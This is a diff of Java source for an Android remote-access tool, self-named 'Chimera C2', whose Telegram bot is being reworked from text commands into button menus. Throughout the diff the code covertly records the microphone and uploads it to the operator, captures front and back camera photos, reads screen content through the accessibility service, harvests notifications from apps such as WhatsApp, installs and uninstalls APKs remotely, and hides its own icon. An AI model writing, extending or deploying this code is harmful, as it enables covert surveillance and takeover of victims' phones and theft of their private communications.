@@ -26,7 +26,7 @@ import java.util.List;
 public class TelegramBotWorker implements Runnable {
     private final Context context;
     private long lastUpdateId = 0;
-    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL }
+    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL, FOR_MIC_DURATION, FOR_IMAGE_PARAMS, FOR_AUDIO_PARAMS }
     private WaitingState currentState = WaitingState.NONE;
     private int customDuration = 0;
     private int customScale = 100;
@@ -72,59 +72,21 @@ public class TelegramBotWorker implements Runnable {
 
     private void handleMessage(JSONObject msg) {
         try {
-            if (msg.getJSONObject("chat").getLong("id") != ConfigLoader.getAdminId()) return;
-            if (msg.has("document") || msg.has("photo") || msg.has("audio")) { handleFileUpload(msg); return; }
+            long chatId = msg.getJSONObject("chat").getLong("id");
+            if (chatId != ConfigLoader.getAdminId()) return;
+
+            if (msg.has("document") || msg.has("photo") || msg.has("audio")) {
+                handleFileUpload(msg);
+                return;
+            }
+
             if (!msg.has("text")) return;
             String text = msg.getString("text").trim();
+
             if (handleStatefulReply(text)) return;
-            String[] parts = text.split(" ");
-            String command = parts[0].toLowerCase();
-            switch (command) {
-                case "/start": case "/help": sendHelpMessage(); break;
-                case "/control": sendControlPanel(); break;
-                case "/deactivate":
-                    sendMessage("Deactivating and returning to dormant state.", context);
-                    context.stopService(new Intent(context, TelegramC2Service.class));
-                    break;
-                case "/toggle_app_hide": DeviceControlHandler.setComponentState(context, false); sendMessage("App icon is now hidden.", context); break;
-                case "/toggle_app_show": DeviceControlHandler.setComponentState(context, true); sendMessage("App icon is now visible.", context); break;
-                case "/grant_usage_access":
-                    Intent usageIntent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
-                    usageIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    context.startActivity(usageIntent);
-                    sendMessage("Usage Access settings opened. Please enable permission for the app.", context);
-                    break;
-                case "/open_link":
-                    if (parts.length > 1) openLink(parts[1]);
-                    else { currentState = WaitingState.FOR_LINK_OPEN; sendMessage("Reply with the full URL to open (e.g., https://google.com)", context); }
-                    break;
-                case "/show_image":
-                    customDuration = 10; customScale = 100;
-                    if (parts.length > 2) { try { customDuration = Integer.parseInt(parts[1]); customScale = Integer.parseInt(parts[2]); } catch (Exception ignored) {} }
-                    currentState = WaitingState.FOR_IMAGE_OVERLAY;
-                    sendMessage("Ready for image file. It will be shown for " + customDuration + "s at " + customScale + "% scale.", context);
-                    break;
-                case "/play_audio":
-                    customDuration = -1;
-                    if (parts.length > 1) { if (!"full".equalsIgnoreCase(parts[1])) { try { customDuration = Integer.parseInt(parts[1]); } catch (NumberFormatException ignored) {} } }
-                    currentState = WaitingState.FOR_AUDIO_PLAY;
-                    String durationText = customDuration > 0 ? "for " + customDuration + " seconds." : "completely.";
-                    sendMessage("Ready for audio file. It will be played " + durationText, context);
-                    break;
-                case "/mic":
-                    int micDuration = 30;
-                    if (parts.length > 1) { try { micDuration = Integer.parseInt(parts[1]); } catch (NumberFormatException ignored) {} }
-                    final int finalMicDuration = micDuration;
-                    sendMessage("Recording " + finalMicDuration + "s of audio...", context);
-                    AudioHandler.startRecording(context, finalMicDuration, new AudioHandler.AudioCallback() {
-                        @Override public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), finalMicDuration + "s Audio", context); }
-                        @Override public void onError(String error) { sendMessage("Audio Error: " + error, context); }
-                    });
-                    break;
-                case "/device_details":
-                    sendMessage("Gathering device intelligence...", context);
-                    DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context));
-                    break;
+
+            if ("/start".equals(text)) {
+                sendMainPanel(chatId, 0); // Send new panel message
             }
         } catch (Exception e) { ErrorLogger.logError(context, "HandleMessage", e); }
     }
@@ -132,19 +94,49 @@ public class TelegramBotWorker implements Runnable {
     private boolean handleStatefulReply(String text) {
         WaitingState previousState = currentState;
         if (previousState == WaitingState.NONE) return false;
-        currentState = WaitingState.NONE;
-        if (previousState == WaitingState.FOR_PACKAGE_NAME_LAUNCH) { launchApp(text); return true; }
-        if (previousState == WaitingState.FOR_PACKAGE_NAME_UNINSTALL) { uninstallApp(text); return true; }
-        if (previousState == WaitingState.FOR_VOLUME) { setVolume(text); return true; }
-        if (previousState == WaitingState.FOR_LINK_OPEN) { openLink(text); return true; }
-        if (previousState == WaitingState.FOR_NOTIFICATION_FILTER) { setNotificationFilter(text); return true; }
-        currentState = previousState;
-        return false;
+        currentState = WaitingState.NONE; // Reset state after handling
+
+        try {
+            switch (previousState) {
+                case FOR_PACKAGE_NAME_LAUNCH: launchApp(text); return true;
+                case FOR_PACKAGE_NAME_UNINSTALL: uninstallApp(text); return true;
+                case FOR_VOLUME: setVolume(text); return true;
+                case FOR_LINK_OPEN: openLink(text); return true;
+                case FOR_NOTIFICATION_FILTER: setNotificationFilter(text); return true;
+                case FOR_MIC_DURATION:
+                    int micDuration = Integer.parseInt(text);
+                    handleMicRecording(micDuration);
+                    return true;
+                case FOR_IMAGE_PARAMS:
+                    String[] imageParams = text.split(" ");
+                    customDuration = Integer.parseInt(imageParams[0]);
+                    customScale = imageParams.length > 1 ? Integer.parseInt(imageParams[1]) : 100;
+                    currentState = WaitingState.FOR_IMAGE_OVERLAY;
+                    sendMessage("Ready for image file. It will be shown for " + customDuration + "s at " + customScale + "% scale.", context);
+                    return true;
+                case FOR_AUDIO_PARAMS:
+                    if ("full".equalsIgnoreCase(text)) {
+                        customDuration = -1;
+                    } else {
+                        customDuration = Integer.parseInt(text);
+                    }
+                    currentState = WaitingState.FOR_AUDIO_PLAY;
+                    String durationText = customDuration > 0 ? "for " + customDuration + " seconds." : "completely.";
+                    sendMessage("Ready for audio file. It will be played " + durationText, context);
+                    return true;
+                default:
+                    currentState = previousState; // Not for this state, so revert
+                    return false;
+            }
+        } catch (Exception e) {
+            sendMessage("Invalid input. Please try the command again.", context);
+            return true; // We handled the state, even if it was an error.
+        }
     }
 
     private void handleFileUpload(JSONObject msg) {
         WaitingState previousState = currentState;
-        currentState = WaitingState.NONE;
+        currentState = WaitingState.NONE; // Always reset state after a file upload attempt
         try {
             String fileId = "", fileName = "tempfile";
             if (msg.has("document")) { fileId = msg.getJSONObject("document").getString("file_id"); fileName = msg.getJSONObject("document").getString("file_name");
@@ -177,35 +169,214 @@ public class TelegramBotWorker implements Runnable {
             String data = cb.getString("data");
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
             int messageId = cb.getJSONObject("message").getInt("message_id");
-            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_GESTURES") || data.equals("SCREEN_OFF"))) { sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context); return; }
+
+            // Answer the callback to remove the "loading" state on the button
+            answerCallbackQuery(cb.getString("id"));
+
+            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("SCREEN_OFF"))) {
+                sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context);
+                return;
+            }
+
             switch (data) {
-                case "LIST_APPS": listAllApps(); break;
-                case "LAUNCH_APP": currentState = WaitingState.FOR_PACKAGE_NAME_LAUNCH; sendMessage("Reply with the package name to launch.", context); break;
-                case "UNINSTALL_APP": currentState = WaitingState.FOR_PACKAGE_NAME_UNINSTALL; sendMessage("Reply with the package name to uninstall.", context); break;
-                case "SET_VOLUME": currentState = WaitingState.FOR_VOLUME; sendMessage("Reply with a volume level from 0 to 100.", context); break;
-                case "INSTALL_APP": currentState = WaitingState.FOR_APK_INSTALL; sendMessage("Upload the APK file to install.", context); break;
-                case "NOTIFICATIONS_PANEL": sendNotificationPanel(chatId, messageId); break;
+                // Panel Navigation
+                case "PANEL_MAIN": sendMainPanel(chatId, messageId); break;
+                case "PANEL_APPS": sendAppPanel(chatId, messageId); break;
+                case "PANEL_DEVICE": sendDeviceControlPanel(chatId, messageId); break;
+                case "PANEL_MEDIA": sendMediaPanel(chatId, messageId); break;
+                case "PANEL_SYSTEM": sendSystemPanel(chatId, messageId); break;
+                case "PANEL_NOTIFS": sendNotificationPanel(chatId, messageId); break;
+                case "PANEL_GESTURES": sendGesturePanel(chatId, messageId); break;
+                case "PANEL_HELP": sendHelpPanel(chatId, messageId); break;
+
+                // App Management Actions
+                case "ACTION_LIST_APPS": listAllApps(); break;
+                case "ACTION_LAUNCH_APP": promptForState(WaitingState.FOR_PACKAGE_NAME_LAUNCH, "Reply with the package name to launch."); break;
+                case "ACTION_UNINSTALL_APP": promptForState(WaitingState.FOR_PACKAGE_NAME_UNINSTALL, "Reply with the package name to uninstall."); break;
+                case "ACTION_INSTALL_APP": promptForState(WaitingState.FOR_APK_INSTALL, "Upload the APK file to install."); break;
+
+                // Device Control Actions
+                case "ACTION_SET_VOLUME": promptForState(WaitingState.FOR_VOLUME, "Reply with a volume level from 0 to 100."); break;
+                case "ACTION_SCREEN_ON": context.startActivity(new Intent(context, WakeActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); break;
+                case "ACTION_SCREEN_OFF": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN); break;
+                case "ACTION_FLASHLIGHT_ON": DeviceControlHandler.setFlashlightState(context, true); break;
+                case "ACTION_FLASHLIGHT_OFF": DeviceControlHandler.setFlashlightState(context, false); break;
+                case "ACTION_GET_DETAILS": DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context)); break;
+
+                // Media Actions
+                case "ACTION_MIC_30": handleMicRecording(30); break;
+                case "ACTION_MIC_60": handleMicRecording(60); break;
+                case "ACTION_MIC_CUSTOM": promptForState(WaitingState.FOR_MIC_DURATION, "Reply with the recording duration in seconds."); break;
+                case "ACTION_CAM_FRONT": handleCameraCapture("CAM1", "Front Camera"); break;
+                case "ACTION_CAM_BACK": handleCameraCapture("CAM2", "Back Camera"); break;
+                case "ACTION_SHOW_IMAGE": promptForState(WaitingState.FOR_IMAGE_PARAMS, "Reply with duration and scale (e.g., `15 80` for 15s at 80% scale). Default is `10 100`."); break;
+                case "ACTION_PLAY_AUDIO": promptForState(WaitingState.FOR_AUDIO_PARAMS, "Reply with duration in seconds, or `full` to play the entire file."); break;
+                case "ACTION_OPEN_LINK": promptForState(WaitingState.FOR_LINK_OPEN, "Reply with the full URL to open (e.g., https://google.com)"); break;
+
+                // System & Services Actions
+                case "ACTION_HIDE_ICON_ON": DeviceControlHandler.setComponentState(context, false); sendMessage("App icon is now hidden.", context); break;
+                case "ACTION_HIDE_ICON_OFF": DeviceControlHandler.setComponentState(context, true); sendMessage("App icon is now visible.", context); break;
+                case "ACTION_GET_CONTENT": sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
+                case "ACTION_GRANT_USAGE":
+                    context.startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                    sendMessage("Usage Access settings opened. Please enable permission for the app.", context);
+                    break;
+                case "ACTION_DEACTIVATE":
+                    sendMessage("Deactivating and returning to dormant state.", context);
+                    context.stopService(new Intent(context, TelegramC2Service.class));
+                    break;
+                case "ACTION_EXIT_PANEL": editMessage(chatId, messageId, "Control panel closed."); break;
+
+                // Notification Actions
                 case "NOTIF_GET_EXISTING": context.sendBroadcast(new Intent("com.chimera.GET_ACTIVE_NOTIFICATIONS")); break;
-                case "NOTIF_SET_FILTER": currentState = WaitingState.FOR_NOTIFICATION_FILTER; sendMessage("Reply with the package name to filter notifications for (e.g., com.whatsapp).", context); break;
+                case "NOTIF_SET_FILTER": promptForState(WaitingState.FOR_NOTIFICATION_FILTER, "Reply with the package name to filter notifications for (e.g., com.whatsapp)."); break;
                 case "NOTIF_CLEAR_FILTER": setNotificationFilter(null); break;
                 case "NOTIF_ENABLE": setNotificationListenerState(true); break;
                 case "NOTIF_DISABLE": setNotificationListenerState(false); break;
-                case "SCREEN_PANEL": sendScreenPanel(chatId, messageId); break;
-                case "SCREEN_ON": context.startActivity(new Intent(context, WakeActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); break;
-                case "SCREEN_OFF": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN); break;
-                case "FLASHLIGHT_ON": DeviceControlHandler.setFlashlightState(context, true); break;
-                case "FLASHLIGHT_OFF": DeviceControlHandler.setFlashlightState(context, false); break;
-                case "CAM_FRONT": handleCameraCapture("CAM1", "Front Camera"); break;
-                case "CAM_BACK": handleCameraCapture("CAM2", "Back Camera"); break;
-                case "ACC_GET_CONTENT": sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
-                case "ACC_GESTURES": sendGesturePanel(chatId, messageId); break;
+
+                // Gesture Actions
                 case "ACC_ACTION_BACK": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK); break;
                 case "ACC_ACTION_HOME": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME); break;
                 case "ACC_ACTION_RECENTS": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS); break;
-                case "BACK_TO_MAIN": sendControlPanel(chatId, messageId); break;
-                case "EXIT_PANEL": editMessage(chatId, messageId, "Control panel closed."); break;
             }
         } catch (Exception e) { ErrorLogger.logError(context, "HandleCallback", e); }
+    }
+    
+    // --- Panel Creation Methods ---
+
+    private void sendMainPanel(long chatId, int messageId) {
+        String text = "`Chimera C2` | Main Menu";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("📱 App Management", "PANEL_APPS")).put(createButton("🕹️ Device Control", "PANEL_DEVICE")));
+            rows.put(new JSONArray().put(createButton("📸 Media Control", "PANEL_MEDIA")).put(createButton("⚙️ System & Services", "PANEL_SYSTEM")));
+            rows.put(new JSONArray().put(createButton("ℹ️ Help", "PANEL_HELP")).put(createButton("❌ Close Panel", "ACTION_EXIT_PANEL")));
+            keyboard.put("inline_keyboard", rows);
+
+            if (messageId == 0) { // New message
+                sendMessageWithMarkup(text, keyboard);
+            } else { // Edit existing message
+                editMessageMarkup(chatId, messageId, text, keyboard);
+            }
+        } catch (Exception e) { ErrorLogger.logError(context, "SendMainPanel", e); }
+    }
+
+    private void sendAppPanel(long chatId, int messageId) {
+        String text = "`App Management`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("List Apps", "ACTION_LIST_APPS")).put(createButton("Launch App", "ACTION_LAUNCH_APP")));
+            rows.put(new JSONArray().put(createButton("Install APK", "ACTION_INSTALL_APP")).put(createButton("Uninstall App", "ACTION_UNINSTALL_APP")));
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendAppPanel", e); }
+    }
+
+    private void sendDeviceControlPanel(long chatId, int messageId) {
+        String text = "`Device Control`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Screen On", "ACTION_SCREEN_ON")).put(createButton("Screen Off", "ACTION_SCREEN_OFF")));
+            rows.put(new JSONArray().put(createButton("Flashlight On", "ACTION_FLASHLIGHT_ON")).put(createButton("Flashlight Off", "ACTION_FLASHLIGHT_OFF")));
+            rows.put(new JSONArray().put(createButton("Set Volume", "ACTION_SET_VOLUME")).put(createButton("Device Intel", "ACTION_GET_DETAILS")));
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendDeviceControlPanel", e); }
+    }
+    
+    private void sendMediaPanel(long chatId, int messageId) {
+        String text = "`Media Control`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Front Cam", "ACTION_CAM_FRONT")).put(createButton("Back Cam", "ACTION_CAM_BACK")));
+            rows.put(new JSONArray().put(createButton("Mic Rec (30s)", "ACTION_MIC_30")).put(createButton("Mic Rec (60s)", "ACTION_MIC_60")));
+            rows.put(new JSONArray().put(createButton("Mic Rec (Custom)", "ACTION_MIC_CUSTOM")));
+            rows.put(new JSONArray().put(createButton("Show Image", "ACTION_SHOW_IMAGE")).put(createButton("Play Audio", "ACTION_PLAY_AUDIO")));
+            rows.put(new JSONArray().put(createButton("Open Link", "ACTION_OPEN_LINK")));
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendMediaPanel", e); }
+    }
+
+    private void sendSystemPanel(long chatId, int messageId) {
+        String text = "`System & Services`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Notifications", "PANEL_NOTIFS")).put(createButton("Gestures", "PANEL_GESTURES")));
+            rows.put(new JSONArray().put(createButton("Get Screen Content", "ACTION_GET_CONTENT")));
+            rows.put(new JSONArray().put(createButton("Show Icon", "ACTION_HIDE_ICON_OFF")).put(createButton("Hide Icon", "ACTION_HIDE_ICON_ON")));
+            rows.put(new JSONArray().put(createButton("Grant Usage Access", "ACTION_GRANT_USAGE")));
+            rows.put(new JSONArray().put(createButton("⚠️ DEACTIVATE ⚠️", "ACTION_DEACTIVATE")));
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendSystemPanel", e); }
+    }
+
+    private void sendNotificationPanel(long chatId, int messageId) {
+        String text = "`Notification Control`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Read Active Notifications", "NOTIF_GET_EXISTING")));
+            rows.put(new JSONArray().put(createButton("Set App Filter", "NOTIF_SET_FILTER")).put(createButton("Clear App Filter", "NOTIF_CLEAR_FILTER")));
+            rows.put(new JSONArray().put(createButton("Enable Service", "NOTIF_ENABLE")).put(createButton("Disable Service", "NOTIF_DISABLE")));
+            rows.put(new JSONArray().put(createButton("« Back to System", "PANEL_SYSTEM")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendNotifPanel", e); }
+    }
+
+    private void sendGesturePanel(long chatId, int messageId) {
+        String text = "`Gesture Control` (Requires Accessibility Service)";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Back", "ACC_ACTION_BACK")).put(createButton("Home", "ACC_ACTION_HOME")).put(createButton("Recents", "ACC_ACTION_RECENTS")));
+            rows.put(new JSONArray().put(createButton("« Back to System", "PANEL_SYSTEM")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendGesturePanel", e); }
+    }
+
+    private void sendHelpPanel(long chatId, int messageId) {
+        String text = "*Chimera C2 Help*\n\n" +
+                      "This bot is controlled entirely through the button interface. Here is a summary of the panels:\n\n" +
+                      "*App Management:*\nList, launch, install, and uninstall user applications.\n\n" +
+                      "*Device Control:*\nToggle screen/flashlight, set volume, and get a detailed intelligence report on the device.\n\n" +
+                      "*Media Control:*\nCapture photos, record audio from the microphone, display images on the screen, play audio, and open web links.\n\n" +
+                      "*System & Services:*\nManage notifications, perform screen gestures, hide the app icon, and grant special permissions.";
+
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendHelpPanel", e); }
+    }
+
+    // --- Action Handler Methods ---
+
+    private void promptForState(WaitingState state, String message) {
+        currentState = state;
+        sendMessage(message, context);
+    }
+    
+    private void handleMicRecording(int duration) {
+        sendMessage("Recording " + duration + "s of audio...", context);
+        AudioHandler.startRecording(context, duration, new AudioHandler.AudioCallback() {
+            @Override public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), duration + "s Audio Capture", context); }
+            @Override public void onError(String error) { sendMessage("Audio Error: " + error, context); }
+        });
     }
 
     private void handleCameraCapture(String cameraId, String cameraName) {
@@ -297,89 +468,30 @@ public class TelegramBotWorker implements Runnable {
 
     private void listAllApps() {
         new Thread(() -> {
-            PackageManager pm = context.getPackageManager();
-            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
-            StringBuilder appList = new StringBuilder();
-            int count = 0;
-            for (ApplicationInfo app : packages) {
-                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                    appList.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
-                    count++;
+            try {
+                PackageManager pm = context.getPackageManager();
+                List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+                StringBuilder appList = new StringBuilder();
+                int count = 0;
+                for (ApplicationInfo app : packages) {
+                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                        appList.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
+                        count++;
+                    }
                 }
+                sendMessage("*--- " + count + " User-Installed Apps ---*\n" + appList.toString(), context);
+            } catch (Exception e) {
+                sendMessage("Failed to list apps.", context);
             }
-            sendMessage("*--- " + count + " User-Installed Apps ---*\n" + appList.toString(), context);
         }).start();
     }
 
-    private void sendHelpMessage() {
-        sendMessage("`Chimera C2 Control`\n\n"
-                + "`/control` - Show the main control panel.\n"
-                + "`/mic <seconds>` - Record audio.\n"
-                + "`/device_details` - Get device intel report.\n"
-                + "`/toggle_app_hide` | `_show` - Toggle icon.\n"
-                + "`/grant_usage_access` - Open Usage Access settings.\n"
-                + "`/open_link [url]` - Open a link.\n"
-                + "`/show_image [dur] [scale]` - Prompt for image upload.\n"
-                + "`/play_audio [dur|full]` - Prompt for audio upload.\n"
-                + "`/help` - Show this message.", context);
-    }
+    // --- Telegram API Helper Methods ---
 
-    private void sendControlPanel() {
-        try {
-            JSONObject keyboard = new JSONObject();
-            JSONArray rows = new JSONArray();
-            rows.put(new JSONArray().put(new JSONObject().put("text", "List Apps").put("callback_data", "LIST_APPS")).put(new JSONObject().put("text", "Launch App").put("callback_data", "LAUNCH_APP")).put(new JSONObject().put("text", "Uninstall App").put("callback_data", "UNINSTALL_APP")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Install App (APK)").put("callback_data", "INSTALL_APP")).put(new JSONObject().put("text", "Set Volume").put("callback_data", "SET_VOLUME")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Notifications").put("callback_data", "NOTIFICATIONS_PANEL")).put(new JSONObject().put("text", "Gestures").put("callback_data", "ACC_GESTURES")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Screen & Device").put("callback_data", "SCREEN_PANEL")).put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "CAM Front").put("callback_data", "CAM_FRONT")).put(new JSONObject().put("text", "CAM Back").put("callback_data", "CAM_BACK")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "❌ Exit Panel ❌").put("callback_data", "EXIT_PANEL")));
-            keyboard.put("inline_keyboard", rows);
-            sendMessageWithMarkup("`Chimera Control Panel`", keyboard);
-        } catch (Exception e) { ErrorLogger.logError(context, "SendControlPanel", e); }
+    private JSONObject createButton(String text, String callbackData) throws org.json.JSONException {
+        return new JSONObject().put("text", text).put("callback_data", callbackData);
     }
-
-    private void sendControlPanel(long chatId, int messageId) {
-        editMessage(chatId, messageId, "");
-        sendControlPanel();
-    }
-
-    private void sendNotificationPanel(long chatId, int messageId) {
-        try {
-            JSONObject keyboard = new JSONObject();
-            JSONArray rows = new JSONArray();
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Read Active Notifications").put("callback_data", "NOTIF_GET_EXISTING")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Set App Filter").put("callback_data", "NOTIF_SET_FILTER")).put(new JSONObject().put("text", "Clear App Filter").put("callback_data", "NOTIF_CLEAR_FILTER")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Enable Service").put("callback_data", "NOTIF_ENABLE")).put(new JSONObject().put("text", "Disable Service").put("callback_data", "NOTIF_DISABLE")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
-            keyboard.put("inline_keyboard", rows);
-            editMessageMarkup(chatId, messageId, "`Notification Control`", keyboard);
-        } catch (Exception e) { ErrorLogger.logError(context, "SendNotifPanel", e); }
-    }
-
-    private void sendScreenPanel(long chatId, int messageId) {
-        try {
-            JSONObject keyboard = new JSONObject();
-            JSONArray rows = new JSONArray();
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Screen On").put("callback_data", "SCREEN_ON")).put(new JSONObject().put("text", "Screen Off").put("callback_data", "SCREEN_OFF")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Flashlight On").put("callback_data", "FLASHLIGHT_ON")).put(new JSONObject().put("text", "Flashlight Off").put("callback_data", "FLASHLIGHT_OFF")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
-            keyboard.put("inline_keyboard", rows);
-            editMessageMarkup(chatId, messageId, "`Screen & Device Control`", keyboard);
-        } catch (Exception e) { ErrorLogger.logError(context, "SendScreenPanel", e); }
-    }
-
-    private void sendGesturePanel(long chatId, int messageId) {
-        try {
-            JSONObject keyboard = new JSONObject();
-            JSONArray rows = new JSONArray();
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Back").put("callback_data", "ACC_ACTION_BACK")).put(new JSONObject().put("text", "Home").put("callback_data", "ACC_ACTION_HOME")).put(new JSONObject().put("text", "Recents").put("callback_data", "ACC_ACTION_RECENTS")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
-            keyboard.put("inline_keyboard", rows);
-            editMessageMarkup(chatId, messageId, "`Gesture Control`", keyboard);
-        } catch (Exception e) { ErrorLogger.logError(context, "SendGesturePanel", e); }
-    }
-
+    
     private void downloadFile(String fileId, String fileName, FileDownloadCallback callback) {
         new Thread(() -> {
             try {
@@ -406,6 +518,16 @@ public class TelegramBotWorker implements Runnable {
         ByteArrayOutputStream result = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int length;
         while ((length = is.read(buffer)) != -1) result.write(buffer, 0, length);
         return result.toString("UTF-8");
+    }
+    
+    private void answerCallbackQuery(String callbackQueryId) {
+        try {
+            JSONObject body = new JSONObject();
+            body.put("callback_query_id", callbackQueryId);
+            post("answerCallbackQuery", body, context);
+        } catch (Exception e) {
+            // Non-critical, fail silently
+        }
     }
 
     private void editMessage(long chatId, int messageId, String text) {
